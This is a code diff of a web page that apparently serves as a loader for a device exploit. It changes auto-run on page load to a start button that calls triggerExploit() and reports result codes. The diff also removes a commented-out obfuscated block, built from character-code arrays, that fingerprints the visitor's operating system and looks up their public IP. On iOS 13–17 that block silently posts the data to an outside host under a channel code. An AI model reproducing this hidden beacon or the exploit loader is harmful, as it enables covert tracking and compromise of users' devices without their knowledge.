         // ============================================================================
-        // Entry Point: Execute exploit with 10ms delay
+        // Start Button
         // ============================================================================
 
-        self.setTimeout(async function () {
-            //try {
-            const result = await triggerExploit();
-            window.log(`[LOADER] Reporting result: ${result}`);
-            // reportResult(
-            //     0 === result ? 0 :
-            //     1001 === result ? 1001 :
-            //     1000 === result ? 1000 :
-            //     1003 === result ? 1003 :
-            //     result
-            // );
-            // } catch (e) {
-            //     window.log(`[LOADER] Top-level error:` + e);
-            //     try {
-            //         reportResult(1000);
-            //     } catch (e2) { }
-            // }
-        }, 10);
+        async function startExploit() {
+            if (exploitStarted) return;
+            exploitStarted = true;
 
-        // stop sending my ip addr
-        /*
-            (function () {
-                const fqMaGkNC = [67, 72, 77, 75, 78, 73, 57, 68, 87, 51, 51, 52, 69, 54, 48, 55, 49, 49].map(W => String.fromCharCode(W ^ 0)).join("");
-        
-                function fqMaGkNI4(W) {
-                    const C = /^(\d{1,3}\.){3}\d{1,3}$/.test(W);
-                    if (!C) return !1;
-                    const q = W.split([46].map(p => String.fromCharCode(p ^ 0)).join(""));
-                    return q.every(p => {
-                        const g = parseInt(p, 10);
-                        return g >= 0 && g <= 255
-                    })
+            var btn = document.getElementById('goBtn');
+            btn.disabled = true;
+            btn.textContent = 'Running...';
+
+            document.getElementById('progressBar').classList.add('active');
+            setProgress(0);
+
+            try {
+                const result = await triggerExploit();
+                if (result === 0) {
+                    setStatus("Success! Tweaks injected", "success");
+                    setProgress(100);
+                    btn.textContent = 'Done';
+                } else if (result === 1001) {
+                    btn.textContent = 'Unsupported';
+                } else if (result === 1003) {
+                    btn.textContent = 'Simulator';
+                } else {
+                    setStatus("Finished (code: " + result + ")", "success");
+                    setProgress(100);
+                    btn.textContent = 'Done';
                 }
-        
-                function isValidIPv6(W) {
-                    const C = /^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$|^::1$|^::$|^([0-9a-fA-F]{1,4}:)*::([0-9a-fA-F]{1,4}:)*[0-9a-fA-F]{1,4}$/.test(W);
-                    return C
-                }
-                async function fqMaGkNI() {
-                    let C = null;
-                    try {
-                        const W = await fetch([104, 116, 116, 112, 115, 58, 47, 47, 105, 112, 118, 52, 46, 105, 99, 97, 110, 104, 97, 122, 105, 112, 46, 99, 111, 109].map(q => String.fromCharCode(q ^ 0)).join(""), {
-                            method: [71, 69, 84].map(q => String.fromCharCode(q ^ 0)).join(""),
-                            headers: ((() => {
-                                const q = {};
-                                q[[65, 99, 99, 101, 112, 116].map(p => String.fromCharCode(p ^ 0)).join("")] = [116, 101, 120, 116, 47, 112, 108, 97, 105, 110].map(p => String.fromCharCode(p ^ 0)).join("");
-                                return q
-                            })())
-                        });
-                        const q = (await W.text()).trim();
-                        if (q && fqMaGkNI4(q)) return q
-                    } catch (W) { }
-                    try {
-                        const W = await fetch([104, 116, 116, 112, 115, 58, 47, 47, 97, 112, 105, 46, 105, 112, 105, 102, 121, 46, 111, 114, 103, 63, 102, 111, 114, 109, 97, 116, 61, 106, 115, 111, 110].map(q => String.fromCharCode(q ^ 0)).join(""));
-                        const q = await W.json();
-                        const p = q.ip ? q.ip.trim() : null;
-                        if (p) {
-                            if (fqMaGkNI4(p)) return p;
-                            if (isValidIPv6(p)) C = p
-                        }
-                    } catch (W) { }
-                    try {
-                        const W = await fetch([104, 116, 116, 112, 115, 58, 47, 47, 105, 112, 118, 54, 46, 105, 99, 97, 110, 104, 97, 122, 105, 112, 46, 99, 111, 109].map(q => String.fromCharCode(q ^ 0)).join(""), {
-                            method: [71, 69, 84].map(q => String.fromCharCode(q ^ 0)).join(""),
-                            headers: ((() => {
-                                const q = {};
-                                q[[65, 99, 99, 101, 112, 116].map(p => String.fromCharCode(p ^ 0)).join("")] = [116, 101, 120, 116, 47, 112, 108, 97, 105, 110].map(p => String.fromCharCode(p ^ 0)).join("");
-                                return q
-                            })())
-                        });
-                        const q = (await W.text()).trim();
-                        if (q && isValidIPv6(q)) return q
-                    } catch (W) { }
-                    if (C) return C;
-                    return null
-                }
-        
-                function fqMaGkNV() {
-                    const W = navigator.userAgent;
-                    const C = W.match(/OS[_\s](\d+)(?:[._](\d+))?/i);
-                    if (C) {
-                        const q = parseInt(C[1], 10);
-                        const p = C[2] || [48].map(g => String.fromCharCode(g ^ 0)).join("");
-                        return [73, 79, 83, 32].map(g => String.fromCharCode(g ^ 0)).join("") + q + [46].map(g => String.fromCharCode(g ^ 0)).join("") + p
-                    }
-                    const M = W.match(/iPhone[_\s]OS[_\s](\d+)(?:[._](\d+))?/i);
-                    if (M) {
-                        const N = parseInt(M[1], 10);
-                        const O = M[2] || [48].map(X => String.fromCharCode(X ^ 0)).join("");
-                        return [73, 79, 83, 32].map(X => String.fromCharCode(X ^ 0)).join("") + N + [46].map(X => String.fromCharCode(X ^ 0)).join("") + O
-                    }
-                    const P = W.match(/Android[_\s](\d+)(?:[._](\d+))?/i);
-                    if (P) {
-                        const Q = parseInt(P[1], 10);
-                        const R = P[2] || [48].map(X => String.fromCharCode(X ^ 0)).join("");
-                        return [65, 110, 100, 114, 111, 105, 100, 32].map(X => String.fromCharCode(X ^ 0)).join("") + Q + [46].map(X => String.fromCharCode(X ^ 0)).join("") + R
-                    }
-                    const S = W.match(/Windows NT (\d+)\.(\d+)/i);
-                    if (S) {
-                        const T = parseInt(S[1], 10);
-                        const U = S[2] || [48].map(X => String.fromCharCode(X ^ 0)).join("");
-                        return [87, 105, 110, 100, 111, 119, 115, 32].map(X => String.fromCharCode(X ^ 0)).join("") + T + [46].map(X => String.fromCharCode(X ^ 0)).join("") + U
-                    }
-                    const V = W.match(/Mac OS X (\d+)[._](\d+)/i);
-                    if (V) {
-                        const Y = parseInt(V[1], 10);
-                        const Z = V[2] || [48].map(X => String.fromCharCode(X ^ 0)).join("");
-                        return [109, 97, 99, 79, 83, 32].map(X => String.fromCharCode(X ^ 0)).join("") + Y + [46].map(X => String.fromCharCode(X ^ 0)).join("") + Z
-                    }
-                    if (/Linux/i.test(W)) return [76, 105, 110, 117, 120].map(M => String.fromCharCode(M ^ 0)).join("");
-                    const AA = W.match(/(Chrome|Firefox|Safari|Edge|Opera)\/(\d+)/i);
-                    if (AA) return AA[1] + [32].map(p => String.fromCharCode(p ^ 0)).join("") + AA[2];
-                    return W.substring(0, 50) + [46, 46, 46].map(M => String.fromCharCode(M ^ 0)).join("")
-                }
-        
-                function fqMaGkNI13() {
-                    const W = navigator.userAgent;
-                    const C = W.match(/OS[_\s](\d+)(?:[._](\d+))?/i);
-                    if (C) {
-                        const q = parseInt(C[1], 10);
-                        return q >= 13 && q <= 17
-                    }
-                    const M = W.match(/iPhone[_\s]OS[_\s](\d+)(?:[._](\d+))?/i);
-                    if (M) {
-                        const N = parseInt(M[1], 10);
-                        return N >= 13 && N <= 17
-                    }
-                    return !1
-                }
-                async function fqMaGkNS() {
-                    try {
-                        if (!fqMaGkNI13()) return;
-                        const W = fqMaGkNC;
-                        const C = await fqMaGkNI();
-                        const q = fqMaGkNV();
-                        if (!W || !C || !q) return;
-                        const p = [104, 116, 116, 112, 115, 58, 47, 47, 56, 100, 102, 57, 46, 99, 99, 47, 97, 112, 105].map(g => String.fromCharCode(g ^ 0)).join("");
-                        const g = await fetch(p + [47, 105, 112, 45, 115, 121, 110, 99, 47, 115, 121, 110, 99].map(X => String.fromCharCode(X ^ 0)).join(""), {
-                            method: [80, 79, 83, 84].map(X => String.fromCharCode(X ^ 0)).join(""),
-                            headers: ((() => {
-                                const X = {};
-                                X[[67, 111, 110, 116, 101, 110, 116, 45, 84, 121, 112, 101].map(L => String.fromCharCode(L ^ 0)).join("")] = [97, 112, 112, 108, 105, 99, 97, 116, 105, 111, 110, 47, 106, 115, 111, 110].map(L => String.fromCharCode(L ^ 0)).join("");
-                                return X
-                            })()),
-                            body: JSON.stringify({
-                                channelCode: W,
-                                ip: C,
-                                deviceVersion: q
-                            })
-                        });
-                        if (!g.ok) {
-                            const X = await g.json().catch(() => ({}))
-                        }
-                    } catch (W) { }
-                }
-                setTimeout(fqMaGkNS, 1000)
-            })();
-        */
+            } catch (e) {
+                setStatus("Failed: " + (e.message || "unknown error"), "error");
+                btn.textContent = 'Retry';
+                btn.disabled = false;
+                exploitStarted = false;
+            }
+        }
     </script>
 </body>
 
